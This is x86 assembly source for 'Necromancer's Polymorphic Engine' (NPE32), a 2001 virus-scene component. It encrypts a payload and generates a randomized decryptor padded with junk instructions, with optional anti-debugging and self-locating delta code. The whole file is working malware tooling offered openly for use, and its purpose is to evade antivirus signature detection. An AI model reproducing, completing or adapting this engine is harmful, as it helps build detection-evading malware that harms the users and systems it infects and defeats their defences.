;==============================================================================
;                       Necromancer's Polymorphic Engine
;                                    v 1.0
;                        (c) necr0mancer december 2001
;
;stdcall
;int NPE_main(
;               DWORD   *offset data                    //offset to data
;               DWORD   *offset bufer                   //offset of bufer(see ramarks)
;               DWORD   count_bytes                     //size of crypting data
;               DWORD   seed                            //(see remarks)
;               DWORD   flags                           //(see remarks)
;            );
;
;Output: EAX = Size of crypted data and decryptor.
;        cf  = 1 if error 
;        cf  = 0 if success
;
;Remarks:
;    Engine must run in r/w section.
;
;   *bufer : Size of bufer must be larger of really size data beakose NPE use
;            bufer for building cryptor/decryptor.
;            In real size of bufer must be about 400h*3+size of data+1
;            But I test it with many-memory allocate & can't said
;            about working npe32 with little bufer.
;
;   Flags:
;
;         bits:
;        ÚÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;        ³  0..6   ³ Using regs32                          ³
;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  7      ³ Antidebug functions enabled           ³
;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  8..11  ³ number of commands in using commands  ³
;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  11..16 ³ number of commands in using garbage   ³
;        ÀÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
; 	  Regs32 (bits 0..6):
;        ÚÄÄÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄ¿
;        ³ bit ³ 0 ³ 1 ³ 2 ³ 3 ³ 4 ³ 5 ³ 6 ³
;        ÃÄÄÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄ´
;        ³ reg ³EAX³EBX³EDX³ECX³ESI³EDI³EBP³
;        ÀÄÄÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÙ
;
;   Seed:
;  	 if this parametr is not NULL then randseed generator of NPE32
;        gets a new value for inicialize.If it is NULL NPE32 use getted
;        value for any random operations.
;
;And one 'little' thing : npe32 has a bug working in multi-layer mode,
;which destroyes original data.If size of encryptors+data more than
;D00h bytes it happends.
;
;necr0mancer2001@hotmail.com


include 1.inc
@x                      equ             <-offset npe_delta>
npe_main proc
							

		
 	       	npe_data        equ     [esp+4*8]+4
               	npe_bufer       equ     [esp+4*8+4]+4
               	npe_size        equ     [esp+4*8+8]+4
               	npe_seed        equ     [esp+4*8+12]+4
               	npe_flags       equ     [esp+4*8+16]+4

               	pusha

	       	call $+5                                 ;get delta
npe_delta:
	       	pop ebp
               	jmp short lets_begin                     ;if ecx=0 then error

;##############################################################################
;FLAGS FORMAT:
;                 BITS
;  ÚÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄ¿
;  ³ 7 ³ 6 ³ 5 ³ 4 ³ 3 ³ 2 ³ 1 ³ 0 ³
;  ÀÄÂÄÁÄÂÄÁÄÂÄÁÄÂÄÁÄÂÄÁÄÂÄÁÄÂÄÁÄÂÄÙ
;    ³   ³   ³   ³   ³   ³   ³   ³
;    ³   ³   ³   ³   ³   ³   ³   ³
;    ³   ³   ³   ³   ³   ³   ³   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;    ÀÄÂÄÙ   ÀÄÄÄÅÄÄÄÙ   ³   ÀÄÄÄÄÄÄÄÄ¿          ³
;  ÚÄÄÄÁÄÄÄÄÂÄÄÄÄÁÄÄÄÂÄÄÄÁÄÄÄÄÄÂÄÄÄÄÄÄÁÄÄÄÄÂÄÄÄÄÄÁÄÄÄÄÄ¿
;  ³codesize³ opsize ³eax using³2nd reg use³1st reg use³
;  ÀÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÙ
                                                        
					
table:
	        opcod <0C081h,10100001b,1>               ;0 add reg,i32
	        opcod <0E881h,10100001b,0>               ;1 sub reg,i32
	        opcod <0F081h,10100001b,2>               ;2 xor reg,i32

	        opcod <0d0f7h,10000101b,3>               ;3 not reg
	        opcod <0C0D1h,10000101b,5>               ;4 rol reg,1
	        opcod <0c8d1h,10000101b,4>               ;5 ror reg,1
                                                         
		opcod <00040h,01000101b,7>               ;6 inc reg
	        opcod <00048h,01000101b,6>               ;7 dec reg
	        opcod <0D8F7h,10000101b,8>               ;8 neg reg
	       ;opcod <0C80Fh,10000101b,9>               ;9 bswap reg32=it are fear bugs:EEE

tableOpsize equ ($-offset table)/4
garbtable:

	        opcod <0c087h,10000010b,0>               ;xchg reg32,reg32
	        opcod <0c08bh,10000010b,0>               ;mov  reg32,reg32
                opcod <0c083h,11001001b,0>               ;add reg,0

	        opcod <0e883h,11001001b,0>               ;sub reg,0
	        opcod <09090h,01000000b,0>               ;nop
		opcod <000EBh,10000000b,0>               ;jmp short $+3

		opcod <0c883h,11001101b,0>               ;or reg32,0
		opcod <0f083h,11001101b,0>               ;xor reg32,0
		opcod <0c00bh,10000010b,0>               ;or reg32,reg32

		opcod <0c023h,10000010b,0>               ;and reg32,reg32

tableGarbsize equ ($-offset garbtable)/4

regs:
		db __eax,__ebx,__edx,__ecx,__esi,__edi,__ebp

flag     	db 		?
xchg_reg  	db 		?                     	 ;1
delta     	dd 		?                     	 ;4
table_esp 	dd 		?                     	 ;4
rnd       	dd 		?                        ;4  +
queue     	db		6 dup (?)            	 ;6
queue2    	db 		6 dup (?)                ;6
regs_dynamic	db  		7 dup (?)

npe32_error:

        	popa
        	stc
        	retn

;=============================================================================
lets_begin:

	        mov ecx,npe_seed
        	jecxz _2nd_generation

        	mov [ebp+seed @x],ecx
_2nd_generation:

	        mov edx,npe_flags
        	push edx

	        and edx,7fh

        	lea edi,[ebp+offset regs_dynamic @x]
        	lea esi,[ebp+offset regs @x]

        	xor eax,eax
        	inc eax
	        smov ecx,7
	        xor ebx,ebx
create_dynamic:

	        push edx
	                                                 
	        and edx,eax                              
	        jz no_add_reg                            ;reg not using
	
	        inc  ebx                                 ;command++
	        movsb

no_add_reg:

	        shl eax,1
	        pop edx
	        loop create_dynamic

	        or ebx,ebx                               ;no regs get?
	        jz npe32_error

	        cmp ebx,3                                ;less regs get?
	        jb npe32_error

	        mov [ebp+num_regs @x],ebx

	        pop eax                                  ;params
        	mov edx,eax
	        and dx,0ffh

	        and ax,0ff00h
        	shr eax,8                                ;high byte

	        mov ecx,eax
	        and eax,11110000b                        ;count of commands
        	shr eax,4

	        cmp eax,tableOpsize
        	jna _ztest				 ;if bigger
        	                                         ;then go na xep
	        smov eax,tableOpsize
_ztest:
        	or eax,eax
	        jz npe32_error

	        mov [ebp+c_commands @x],eax

	        and ecx,00001111b                        ;count of garbage
	        cmp ecx,tableGarbsize
	        jna _ztest2

	        smov ecx,tableGarbsize
_ztest2:
	        or ecx,ecx
	        jz npe32_error

	        mov [ebp+c_garbage @x],ecx

;=============================================================================

	        mov ecx,npe_size
	        mov [ebp+_c_size @x],ecx                 ;save data size

	        mov edi,npe_bufer
	        mov esi,npe_data

;=============================================================================

	        push edi                                ;save begin of bufer
	        push ebx                                ;count of regs
	        push ecx

	        add edi,400h*3                          ;4th kb=data
	        push edi                                ;save offset data moved

	        mov eax,90h
	        add ecx,eax                             ;maximum captured size
	        rep stosb

	        pop edi
        	pop ecx

	        mov ebx,edi                             ;ebx=for data

        	bt edx,7                                ;antidebug enabled
        	jnc _copy_data

	        push ecx
        	push esi

	        lea esi,[ebp+fuck_debug @x]
	        mov ecx,aDebugSize
	        add 4 ptr[ebp+_c_size @x],ecx           ;add debug_size
	        rep movsb

	        pop esi
	        pop ecx

_copy_data:

	        rep movsb                               ;copy data in bufer

;------------------------------------------------------------------------------
;Get regs:

	        lea ecx,[ebp+random @x]                 ;ECX=offset random proc
	        pop eax
	        mov esi,eax                             ;esi=max_regs
	        call ecx                                ;random();
	        mov dl,byte ptr[ebp+eax+regs_dynamic @x];DL= index size reg mask

getmore:

	        mov eax,esi                             ;maximum=5 regs(1 for indexing,\\
	        call ecx                                ; \1 for xchg)
	        mov dh,byte ptr[ebp+eax+regs_dynamic @x];DL=Index size reg mask
	        cmp dh,dl
	        je getmore
	        mov [ebp+xchg_reg @x],dh                ;get xchg_reg

	        push esi

	        dec esi
	        dec esi
	        mov eax,esi                             ;maximum=5(1 for indexing-eax)
	        call ecx                                ;random();
	        inc eax

	        mov [ebp+qlength @x],ax

;------------------------------------------------------------------------------
;Generate reg32 queue:

	        xchg ecx,eax                            ;ecx=maximum regs

	        pop eax
	        lea esi,[ebp+regs_dynamic @x]           ;esi=offset of generated queqe
	        lea edi,[ebp+queue @x]
	        call random_queue

	        pop edi                                 ;pointer to memory
	        push edi

;==============================================================================

	        ;IN:
	        ;dl=reg indexing
	        ;edi=esi=offset begin to write
	        ;ebx=offset data
	        ;OUT:
	        ;edi=new address
	        xor eax,eax                             ;no garbage generate
	        call begin_generate

	        push eax                                ;=
	        fistp 4 ptr[esp]                        ;= clear FPU stack
	        pop eax                                 ;=

	        smov eax,MAX_OPERATIONS                 ;maximum commands num
	        call random                             ;to create for one time
	        inc eax
	        xchg eax,ecx                            ;See params in end of file

        	mov eax,[esp+4]                         ;offset of begin bufer
	        add eax,3*400h                          ;eax=offset data to crypt
        	mov [ebp+table_esp @x],eax

_addcom:
	        push ecx                                ;save indexing

        	;esi=from gen
	        ;edi=to gen
	        ;ecx=length
        	;eax=num random
	        push edi
        	movzx eax,word ptr[ebp+qlength @x]
	        mov ecx,eax
	        dec eax
	        lea esi,[ebp+queue @x]
        	lea edi,[esi+6]                         ;offset queue2(åà¥­®¢ 
	        mov ebx,edi                             ;           ®¯â¨¬¨§ æ¨ï)
	        call random_queue                       ;randomize(1/6)queue
        	pop edi

	        xchg esi,ebx                            ;esi=offset queue2
        	                                        ;ecx=qlength
_for_regs:

	        lodsb
	        mov dh,al                               ;DH=reg32 to use for it command
	        push esi

;Input:
;       eax=stos recod #eax in table for decode(al=-1 if random)
;       ebx=num elements in table
;       esi=offset build table
;       edi=output bufer
;       dh=reg32 creator
;Output:
;       edi=new pointer behind com
;       eax=num used command

	        smov eax,0FFh                           ;Gen random(0ffh)

                db (0b8h OR __ebx)
c_commands      dd 0

	        lea esi,[ebp+table @x]                  ;offset table of commands
        	call stos_command                       ;write rand. command with
                	                                ;reg32 in DH
	        lea esi,[ebp+table_esp @x]              ;ESI=table_esp

	        xchg esp,4 ptr[esi]

	        mov ah,dh                               ;save cur reg32+position
	        push eax                                ;

	        mov eax,[ebp+rnd @x]                    ;save Rnd(lazy,lazy MAN....)
	        push eax

	        xchg esp,4 ptr[esi]

	        pop esi
		loop _for_regs


	        pop ecx
		loop    _addcom


	        xor eax,eax                             ;no garbage,no ret
	        call end_generate                       ;generate logic end

	        pop esi                                 ;ESI=begin of cryptor

	        pusha
	        call esi
	        popa

;==============================================================================
;generate encryptor

;IN:
;	dh=reg gen
;	dl=reg indexing
;	edi=esi=offset begin to write
;	ebx=offset data
;OUT:
;	edi=new address
	        pop edi
	        push edi
		;mov edi,esi                            ;edi=begin of getted memory

	        mov ebx,edi
        	add ebx,3*400h                          ;EBX=data to encrypt()
	        push esi                                ;save for jmp to ....
        	push ebx                                ;save for end_generate

	        mov al,1                                ;garbage generate
        	call begin_generate

_extcommand:

;Input:
;       eax=stos recod #eax in table for decode(-1 if random)
;       ebx=num elements in table
;       esi=offset build table
;       edi=output bufer
;       dh=reg32 creator
;Output:
;       edi=new pointer behind com
;       eax=num used command

        	call left_command

	        lea esi,[ebp+table_esp @x]

	        xchg esp,4 ptr[esi]
	         pop  eax                               ;rnd
	         mov [ebp+rnd @x],eax
	         pop  eax                               ;comm
	         mov ebx,esp                            ;ebx=save esp_command
	        xchg esp,4 ptr[esi]

	        mov ecx,[esp]                           ;if esp>data then _jmp exit_off
	        cmp ebx,ecx
        	ja _exit_off

	        mov dh,ah                               ;dh=using reg
	        mov ah,0

;Input:
;       eax=stos recod #eax in table for decode(-1 if random)
;       ebx=num elements in table
;       esi=offset build table
;       edi=output bufer
;       dh=reg32 creator
;
;Output:
;       edi=new pointer behind com
;       eax=num used command
;=============================================================================;

	        lea esi,[ebp+offset table @x]
	        call stos_command

	        jmp short _extcommand

_exit_off:

;In:
;	 edi=adr
;	 [ebp+pos]=position of begin(genned)
;	 [ebp+xchg_reg]=reg for exchange
;Out:
;	 edi=new adr
;=============================================================================

	        mov al,1                                ;garbage,ret
	        call end_generate                       ;generate logic end

	        mov ebx,edi                             ;ebx=edi=for correct
	        pop esi                                 ;esi=crypted data

	        movzx eax,word ptr[ebp+qlength @x]
        	db (0b8h or __ecx)                      ;mov ecx,xxxxxxxx
r_round dd 0
	        mul cx
	        xchg eax,ecx                            ;ecx=eax
        	rep movsd                               ;copy crypted data

	        pop eax                                 ;eax=begin of all
        	sub edi,eax                             ;edi=size of all
	        mov 4 ptr[esp._eax],edi                	;save edi in output

	        db 0bfh                                 ;mov edi,adr(for lea_correct)
addr dd 0

	        mov eax,[ebp+delta @x]                  ;eax=generated random delta(av,av....)

	        push eax
        	fistp 4 ptr[esp]                        ;get from fpu stack
	        pop  ecx                                ;ecx=address of call xxxxxxxx

	        sub ebx,ecx                             ;ebx=data-offset end call xxxxx
	        add eax,ebx                             ;delta+data-offset end call xxxxx
	        stosd                                   ;correct adr

	        clc                                     ;set carry in 0=success
	        popa
	        ret 5*4                                 ;clear stack
npe_main endp

;==============================================================================
;IN:
	;al=1(if garbage enabled)
	;ebx=offset data
	;dh=reg gen
	;dl=reg indexing
	;edi=offset begin to write
;OUT:
	;edi=new address

begin_generate proc

	        mov esi,edi                             ;edi=esi

        	dec al                                  ;AL=1?
	        jnz _zgl                                ;if yes put garbage proc

	        lea ecx,[ebp+left_command @x]
	        jmp short _others
_zgl:
	        lea ecx,[ebp+zaglushka @x]

_others:
	        xor eax,eax
        	dec eax
	        call random
        	mov [ebp+delta @x],eax                  ;get random delta

	        call ecx                                ;call left-command

	        push edi
        	fild 4 ptr[esp]                         ;save adress for correct lea[]
	        pop eax

	        mov al,0E8h             	        ;call 000000
	        stosb
        	xor eax,eax
	        stosd

	        call ecx                                ;call left_command

	        push edx                                ;save current using reg32
hahaha:         
                        ;===Get random reg(exept EAX)===

	        mov eax,[ebp+num_regs @x]
	        call random
        	mov dh,byte ptr[ebp+eax+regs_dynamic @x]
	        cmp dh,__eax                            ;dh=r_reg32
        	je hahaha

        	mov al,58h                              ;pop (reg32 or r_reg32)
	        or al,dh
	        stosb

	        call ecx                                ;call left_command

	        mov ax,0E881h                           ;sub (reg32 or r_reg32),delta
        	or ah,dh
	        stosw
        	mov eax,[ebp+delta @x]                  ;delta+5(size call xxxxxxxx)
	        add eax,5
	        stosd

	        call ecx                                ;call left_command

	        push ecx                                ;save left_command or zaglushka adress
	        mov ax,808Dh                            ;lea  (reg32 or r_reg32),[ebp.....]
	        or ah,dh
	        mov dh,[ebp+xchg_reg @x]                ;dh=xchg_reg
	        mov dl,dh                               ;dl=dh=xchg_reg

        	shl dh,3
	        or  ah,dh                               ;modify command
        	stosw
	

        	mov eax,[ebp+delta @x]                  ;eax=delta
	        sub ebx,esi                             ;ebx=data-count random
       	 	add eax,ebx
        	mov [ebp+addr @x],edi                   ;save edi(for correcting in future)
	        stosd
	        pop ecx
	        call ecx                                ;call left_command

	        mov ax,0E087h                           ;xchg xchg_reg32,esp
	        or ah,dl                                ;dl=xchg_reg
	       	stosw
        	pop edx                                 ;our using regs

	        call ecx                                ;call left_command

	        mov al,0b8h                             ;mov reg32,xxxxxxxx
	        or  al,dl
        	stosb

	        push edx                                ;save regs
        	push ecx                                ;save left_adr

	        db 0B8h                                 ;mov eax,_c_size(size of all data)
_c_size 	dd 0

	        cdq                                     ;edx=0
        	xor ecx,ecx                             ;ecx=0

	        db 66h,0b9h                             ;mov cx,qlength
qlength 	dw 0

	        shl ecx,2                               ;ecx=ecx*4
        	div cx
	        inc eax
        	mov [ebp+r_round @x],eax                ;SAVE ROUNDED SIZE/qlength*4
	        stosd
	        pop ecx                                 ;restore left_adr
        	call ecx                                ;call left_command

        	mov eax,edi
	        inc eax
	        mov [ebp+pos @x],eax                    ;save pre-pop adr

;===Generate pop's ===

	        xchg ecx,edx
        	movzx ecx,[ebp+offset qlength @x]
	        lea  esi,[ebp+offset queue @x]
_@1:
        	lodsb
	        or al,58h                               ;pop reg32
        	stosb
	        call edx                                ;call left_command
        	loop _@1

	        pop edx
        	retn
begin_generate endp

;=============================================================================
;In:
; 	edi=adr
; 	al=1(garb enabled)
;	[ebp+pos]=position of begin(genned)
; 	[ebp+xchg_reg]=reg for exchange
;Out:
; 	edi=new adr
;=============================================================================
end_generate    proc

        	push ebx
	        push eax
        	dec al                                  ;al-state
	        jnz _zgl_1

        	lea ebx,[ebp+left_command @x]
	        jmp short _others_1
_zgl_1:
	        lea ebx,[ebp+zaglushka @x]
_others_1:

        	call ebx                                ;call left_command

;===Push's Generate===

	        movzx ecx,[ebp+qlength @x]
        	push ecx                                ;save qlength
	        lea  esi,[ebp+queue @x]
        	add  esi,ecx
	        dec esi                                 ;esi=end queue
_@2:
	        std
        	lodsb
	        cld
       		or al,50h                               ;push reg32
	        stosb
        	call ebx                                ;call left_command
	        loop _@2

;==============================================================================

	        mov ax,0C481h                           ;add esp,xxxxxxxx
        	stosw

	        pop eax                                 ;load  qlength
	        shl eax,2                               ;eax=eax*4
        	stosd
	        call ebx                                ;call left_command

	        mov ax,7448h                            ;dec index
        	or al,dl                                ;jz        +
	        stosw                                   ;-------------

        	                                        ;dec reg32+ jz _@exit_
	        push edi                                ;save offset
	        stosb                                   ;_@exit_

	        call ebx                                ;call left_command

	        mov al,0e9h                             ;jmp xxxxxxxxx
        	stosb

	        db 0beh                                 ;mov esi,[ebp+pos] (begin ofpre-pop's)
pos     	dd 0

	        mov eax,edi
        	add eax,5
	        sub eax,esi                             ;eax=to jmp
	        neg eax					;set znakoviy falg:)
        	stosd

	        call ebx                                ;call left_command

        	xchg edi,esi                            ;edi=>esi
	        pop edi                                 ;jz+1 adr

        	mov eax,esi
	        sub eax,edi
        	dec eax
	        stosb

        	xchg edi,esi                            ;edi<=esi

	        call ebx                                ;call left_command
;_@exit_:
 	        mov ax,0E087h                           ;xchg reg32,esp
	        or ah,byte ptr[ebp+xchg_reg @x]
        	stosw

	        call ebx                                ;call left_command

        	pop eax                                 ;restore al state
	        dec al
        	jz no_ret                               ;gen ret?

	        mov al,0c3h                             ;retn if need
        	stosb
no_ret:
        	pop ebx
	        retn
end_generate endp



;=============================================================================

left_command proc
	        pusha

        	mov eax,MAX_GARBAGE
	        call random
        	inc eax
	        xchg eax,ecx

gen_garbage:

        	db 0b8h
num_regs 	dd 0

	        call random
        	mov dh,byte ptr[ebp+eax+regs_dynamic @x]

	        mov eax,0ffh                            
        	lea esi,[ebp+garbtable @x]
	        db (0b8h or __ebx) 			;mov ebx,xxxxxxxx
		;smov ebx,tableGarbsize

c_garbage 	dd 0
	        call stos_command

		loop gen_garbage

	        mov [esp._edi],edi
        	popa
;=============================================================================;
zaglushka:
	        retn

left_command endp

;=============================================================================;
;Input:
;       eax=stos recod #eax in table for decode(-1 if random)
;       ebx=num elements in table
;       esi=offset build table
;       edi=output bufer
;       dh=reg32 creator
;Output:
;       edi=new pointer behind com
;       eax=num used command
;=============================================================================;
stos_command  proc
	        pusha
	
        	cmp al,0FFh
	        je _code_command

        	mov byte ptr[ebp+flag @x],1
        	                                        

	        lea eax,[eax*4+esi]                     ;eax=adr code command
        	movzx ebx,byte ptr[eax.code_num]

	        lea eax,[ebx*4+esi]                     ;eax=addr decode command
       		mov dl,byte ptr[eax.flags]              ;attributes
	        mov ax,word ptr[eax.code]               ;opcode command

        	jmp short _always

_code_command:
	        mov byte ptr[ebp+flag @x],0

	        xchg eax,ebx
        	call random


	        mov [esp._eax],eax			;save for output
        	lea eax,[eax*4+esi]

	        mov dl,byte ptr[eax.flags]              ;attributes
        	mov ax,word ptr[eax.code]

_always:
;ax=cod
;dl=flags
;edi=d buf
;------------------------------------------------------------------------------

;test for eax:
	        mov ch,dl                               ;save attributes

	        cmp dh,__eax
        	jne  _not_test_next

	        bt edx,2
        	jnc __end_analyse

_not_test_next:

	        and dl,00000011b

	        or dl,dl
        	jz __opcode_size
	        dec dl
        	jz __1reg

__2reg:
	        mov dl,dh                               ;dl=reg32
	        shl dl,3                                ;shl reg32,3 (ex:000111->111000)
        	or ah,dl                                ;calc mask+command=modcommand

__1reg:
	        or ah,ah                                ;ah=0?
        	jnz _no_op
	        or al,dh
_no_op:
	        or ah,dh                                ;calc mask+command=modcommand
__opcode_size:

	        mov dl,ch                               ;dl=attributes
        	and dl,11000000b

	        shr dl,6                                ;dl=000000XXb

        	dec dl
	        jnz __2
        	stosb

	        jmp short __operand
__2:
        	stosw

__operand:

	        mov dl,ch
        	and dl,00111000b
	        shr dl,3

        	dec byte ptr[ebp+offset flag @x]
	        jz __gen

        	xor eax,eax                             ;mov eax,0ffffffxxxx
	        dec eax
        	call random

	        mov [ebp+rnd @x],eax
        	jmp short __no_gen

__gen:
	        mov eax,[ebp+rnd @x]

__no_gen:
        	cmp dl,4
	        je  __r4

        	cmp dl,2
	        je  __r2

        	dec dl
	        jz  __r1
        	jmp short __end_analyse

__r4:
	        stosd
        	jmp short __end_analyse
__r2:
	        stosw
        	jmp short __end_analyse
__r1:
	        xor eax,eax
        	stosb

__end_analyse:

	        mov [esp._edi],edi                      ;save edi

	        popa
        	ret
stos_command  endp

;=============================================================================
;                         ===Generate reg32 queue:===
;iN:
;	esi=from gen
;	edi=to gen
;	ecx=length

random_queue proc
        	pusha

	        dec ecx
        	jz one

	        push eax                                ;push maximum offset
_get_:
	        pop eax
        	push eax
	        call random                             ;eax=max
        	mov al,byte ptr[esi+eax]
	        cmp al,dl                               ;not indexin
        	je _get_
	        cmp al,byte ptr[ebp+xchg_reg @x]        ;not xchg_reg
	        je _get_
	        stosb
        	xchg ah,al                              ;ah=al=our rand reg
        	pop ebx                                 ;clear stack
_rotate_:
	        lodsb

        	cmp al,dl                               ;not indexin
	        je _rotate_

        	cmp al,byte ptr[ebp+xchg_reg @x]        ;not xchg_reg
	        je _rotate_

	        cmp al,ah
        	je _rotate_

	        stosb
		loop _rotate_

	        popa
	        ret
one:
        	xchg ebx,eax

one_rnd:

	        mov eax,ebx
        	call random
	        mov al,byte ptr[esi+eax]
        	cmp al,dl                               ;not indexin
	        je one_rnd
        	cmp al,byte ptr[ebp+xchg_reg @x]        ;not xchg_reg
	        je one_rnd
        	stosb

	        popa
        	ret
random_queue endp



;=============================================================================
;Input:		eax=max_random
;Output:	eax=random
random proc
	        pusha
        	push eax                                ;save max_random

	        db 0b8h                                 ;mov eax,xxxxxxxx
seed    	dd 12345678h

	        mov edi,134775813                       ;eax=new seed
        	mul edi                                 ;EDX:EAX=EAX*EDI
	        inc eax
        	mov [ebp+seed @x],eax

	        xor edx,edx

        	pop ecx
	        or ecx,ecx                              ;max_random=0
        	jz div_0
	        div ecx

        	mov [esp._eax],edx
div_0:
	        popa
        	ret
random endp

	        db 'NPE32['
        	db _npe_size/1000 mod 10 + '0'
	        db _npe_size/100  mod 10 + '0'
        	db _npe_size/10   mod 10 + '0'
	        db _npe_size/1    mod 10 + '0'
        	db ']necr0mancer'

fuck_debug:                                             
include adebug.inc                     			;simple antidebug proc
aDebugSize              equ $-offset fuck_debug

_npe_size  equ ($-offset npe_main)
;------------------------------------------------------------------------------